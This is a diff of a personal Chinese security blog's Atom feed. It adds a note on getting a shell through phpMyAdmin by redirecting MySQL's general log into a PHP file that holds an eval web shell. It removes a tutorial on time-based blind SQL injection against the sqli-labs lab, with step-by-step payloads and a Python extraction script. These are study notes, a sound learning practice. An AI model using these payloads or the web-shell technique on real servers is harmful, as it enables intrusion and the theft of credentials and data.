@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-27T14:57:52.825Z</updated>
+    <updated>2021-04-29T14:09:04.618Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -10,6 +10,40 @@
     <logo>https://Morn-zh.github.io/images/avatar.png</logo>
     <icon>https://Morn-zh.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Morn-zh</rights>
+    <entry>
+        <title type="html"><![CDATA[phpMyAdmin随记]]></title>
+        <id>https://Morn-zh.github.io/post/phpmyadmin-sui-ji/</id>
+        <link href="https://Morn-zh.github.io/post/phpmyadmin-sui-ji/">
+        </link>
+        <updated>2021-04-29T14:08:46.000Z</updated>
+        <content type="html"><![CDATA[<p>版本：phpMyAdmin4.8.5</p>
+<p>查阅版本信息：</p>
+<p>http://localhost/phpMyAdmin4.8.5/README<br>
+http://localhost/phpMyAdmin4.8.5/changelog.php</p>
+<p>phpMyAdmin常规getshell<br>
+1.可以看看网站是否存在注入利用注入出来的账号密码登录（x<br>
+2.使用phpmyadmin爆破工具进行爆破进入后台（x</p>
+<p>查看写入权限</p>
+<pre><code>show variables like '%secure%'
+</code></pre>
+<p>查看日志设置</p>
+<pre><code>show variables like 'general_log%'
+</code></pre>
+<pre><code>第一步手动开启日志。
+set global  general_log='on'   //首先设置为on
+第二步 修改日志路径
+set global  general_log_file =&quot;d:\\phpstudy\\www\\a.php&quot;
+然后 查看是否开启成功
+show variables like &quot;general_log%&quot;
+</code></pre>
+<pre><code>然后只要执行的语句都会写入到日志文件中，所以我们查询语句
+select '&lt;?php eval($_POST['a']);?&gt;'
+虽然报错但已经写进去了
+</code></pre>
+<p>参考文章：</p>
+<p>https://www.cnblogs.com/xhcbj/p/13356580.html</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[phpinfo中值得注意的点]]></title>
         <id>https://Morn-zh.github.io/post/phpinfo-zhong-zhi-de-zhu-yi-de-dian/</id>
@@ -695,7 +729,7 @@ eg：常规写法 select substr(&quot;string&quot;,1,3)</p>
 <ul>
 <li>当 secure_file_priv 的值为null ，表⽰限制mysqld 不允许导⼊|导出</li>
 <li>当 secure_file_priv 的值为/tmp/ ，表⽰限制mysqld 的导⼊|导出只能发⽣在/tmp/⽬录下</li>
-<li>当secure_file_priv设置为空格 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
+<li>当secure_file_priv设置为空 ，即 '' ，表⽰不对mysqld 的导⼊|导出做限制。</li>
 </ul>
 </li>
 </ul>
@@ -826,210 +860,6 @@ secure_file_priv
 <p>参考资料</p>
 <p>https://blog.csdn.net/niexinming/article/details/49109683</p>
 <p>https://www.jb51.net/article/29462.htm</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[MySQL手注之延时盲注(基于时间的盲注)]]></title>
-        <id>https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/</id>
-        <link href="https://Morn-zh.github.io/post/mysql-shou-zhu-zhi-yan-shi-mang-zhu-ji-yu-shi-jian-de-mang-zhu/">
-        </link>
-        <updated>2021-04-16T13:54:09.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="mysql手注之延时盲注基于时间的盲注">MySQL手注之延时盲注(基于时间的盲注)</h1>
-<blockquote>
-<p>参考文章：https://www.cdxy.me/?p=789</p>
-<p>https://www.cnblogs.com/forforever/p/13019703.html</p>
-<p>https://my.oschina.net/u/4615518/blog/4554203</p>
-<p><a href="https://www.cnblogs.com/joker-vip/p/12698962.html">绕过姿势</a></p>
-</blockquote>
-<h2 id="原理">原理</h2>
-<p>将延时作为判断依据，判断相关的信息</p>
-<h2 id="实验环境">实验环境</h2>
-<p>sqli-libs-Less-9</p>
-<h2 id="常见函数">常见函数</h2>
-<ul>
-<li>
-<p>if(Condition,A,B) ：如果Condition成⽴，则A，否则B</p>
-</li>
-<li>
-<p>substr函数</p>
-</li>
-<li>
-<p>ascii函数</p>
-</li>
-<li>
-<p>延迟函数</p>
-<ul>
-<li>
-<p>mysql&gt;=5.0 使⽤sleep()进⾏查询</p>
-<pre><code>id=1 and sleep(5)
-</code></pre>
-</li>
-<li>
-<p>mysql&lt;5.0使⽤benchmark()进⾏查询</p>
-<p>benchmark是通过查询次数增多，时间变得缓慢来判断是否存在延迟</p>
-<pre><code>select benchmark(1000,select * from admin);
-</code></pre>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="实践">实践</h2>
-<p>关键性源码</p>
-<pre><code>if(isset($_GET['id']))
-{
-$id=$_GET['id'];
-//logging the connection parameters to a file for analysis.
-$fp=fopen('result.txt','a');
-fwrite($fp,'ID:'.$id.&quot;\n&quot;);
-fclose($fp);
-
-// connectivity 
-
-
-$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;;
-$result=mysql_query($sql);
-$row = mysql_fetch_array($result);
-
-	if($row)//无论row存在与否，返回内容都是一致的
-	{
-  	echo 'You are in...........';
-  	}
-	else 
-	{
-	echo 'You are in...........';
-	//print_r(mysql_error());
-	//echo &quot;You have an error in your SQL syntax&quot;;	
-	
-	}
-}
-	else { echo &quot;Please input the ID as parameter with numeric value&quot;;}
-</code></pre>
-<h3 id="源码分析">源码分析</h3>
-<p>这里我们可以看到，无论我们输入什么，返回的内容都是一样的</p>
-<p>无法用联合查询，因为没有回显点，返回的内容都是一样的</p>
-<p>无法使用布尔查询，因为无论真假，返回都是一致的，不会返回给你真假（数据的存在与否等）</p>
-<p>这里，如果我们将else里的解注释掉，那么这里就可以使用布尔盲注了，因为这样我们就可以以问话的形式，进行询问（数据库名长度为1吗？假；长度为2吗？真；第一个是“a”吗？假；……）</p>
-<pre><code>print_r(mysql_error());
-echo &quot;You have an error in your SQL syntax&quot;;
-</code></pre>
-<h3 id="步骤">步骤</h3>
-<h4 id="1-判断是都存在注入">1、判断是都存在注入</h4>
-<pre><code>1' and sleep(5)--+
-</code></pre>
-<pre><code>SELECT * FROM users WHERE id='1' and sleep(5)--+' LIMIT 0,1;
-</code></pre>
-<p>如果加载了5s，那么说明存在注入</p>
-<h5 id="插曲">插曲</h5>
-<p>在本地测试语句的时候，犯了低级失误</p>
-<pre><code>select * from users and sleep(5);# 这样是有语法错误的
-</code></pre>
-<p>可以这样，使用union</p>
-<pre><code>select * from users union select 1,2,3,sleep(5);# 当然需要保证union select个数正确
-</code></pre>
-<p>更简单的可以这样，这样每查询一条，就会休眠1s，假如条数多就真的休眠了QAQ</p>
-<pre><code>select sleep(1) from users;
-</code></pre>
-<p>突发奇想，这样是不是可以通过休眠的时间判断相关的信息的数量，感觉有点蠢。</p>
-<p>以上仅为测试过程中发现的好玩的东西~</p>
-<h4 id="2-判断当前用户">2、判断当前用户</h4>
-<pre><code>and if(ascii(substr(user(),1,1))=114,sleep(5),1)
-</code></pre>
-<h4 id="3-拆解数据库名">3、拆解数据库名</h4>
-<h5 id="判断数据库名的长度">判断数据库名的长度</h5>
-<pre><code>1' and if(length(database())=8,sleep(5),1)--+
-</code></pre>
-<h5 id="拆解具体字符">拆解具体字符</h5>
-<pre><code>1' and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)--+
-</code></pre>
-<h4 id="4-拆解表名">4、拆解表名</h4>
-<h5 id="判断表格数量">判断表格数量</h5>
-<pre><code>1' and if((select count(table_name) from information_schema.tables where table_schema=database())=n,sleep(5),1)--+
-</code></pre>
-<h5 id="判断表名长度">判断表名长度</h5>
-<pre><code>1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit n-1,1),num,1))&gt;guess_ascii--+
-</code></pre>
-<h5 id="拆解具体字符-2">拆解具体字符</h5>
-<pre><code>1' and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables
-where table_schema=database() LIMIT 0,1),1,1))=116,sleep(5),1)--+
-</code></pre>
-<h4 id="5-拆解列名">5、拆解列名</h4>
-<h5 id="判断列数">判断列数</h5>
-<pre><code>1' and (select count(column_name) from information_schema.columns where table_name= 'admin')=n --+
-</code></pre>
-<h5 id="判断列名长度">判断列名长度</h5>
-<pre><code>1' and length(substr((select column_name from information_schema.columns where table_name= 'admin' limit n-1,1),1))=guess_length --+
-</code></pre>
-<h5 id="判断具体字符">判断具体字符</h5>
-<pre><code>1' and if(ascii(substr((select column_name from information_schema.columns where
-table_name='admin' limit,0,1),1,1))&gt;100,sleep(5),1)--+
-</code></pre>
-<h4 id="6-拆解数据">6、拆解数据</h4>
-<pre><code>1' and if(ascii(substr((select password from admin limit 0,1),1,1))&gt;100,sleep(5),1)--+
-</code></pre>
-<p>……</p>
-<h2 id="附录python3时间注入脚本">附录：python3时间注入脚本</h2>
-<pre><code># encoding=utf-8
-
-# 时间盲注脚本
-import requests
-import time
-import datetime
-
-
-# 获取数据库长度
-def database_len():
-    # 存放跑出的结果
-    length = 0
-    database = ''
-    print(&quot;start get length...&quot;)
-    guess_max_length = 15
-
-    for l in range(1, guess_max_length + 1):
-
-        startTime1 = time.time()
-
-        url1 = &quot;http://127.0.0.1/sqli-lab/Less-9/?id=1' and if(length(database())=%d,sleep(2),1)--+&quot; % (l)
-
-        response1 = requests.get(url1)
-
-        if time.time() - startTime1 &gt; 1:
-            length += l
-
-    print(&quot;the length :&quot;, str(length))
-
-    # break
-
-    return length
-
-
-# database_len()
-# 获取数据库名
-def database_name(data_len):
-    print(&quot;start database sql injection...&quot;)
-    name = ''
-    for j in range(1, data_len + 1):
-        for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
-            url = '''http://127.0.0.1/sqli-lab/Less-9/'''
-            payload = '''?id=1' and if(substr(database(),%d,1)='%s',sleep(2),1)''' % (
-                j, i)
-            # print(url+payload+'--+')
-            time1 = datetime.datetime.now()
-            res = requests.get(url + payload + '--+')
-            time2 = datetime.datetime.now()
-            sec = (time2 - time1).seconds
-            if sec &gt;= 2:
-                name += i
-                print(name)
-                break
-    print('database_name:', name)
-
-
-data_len = database_len()
-
-database_name(data_len)
-
-</code></pre>
-<p>可能存在误差~</p>
 ]]></content>
     </entry>
 </feed>
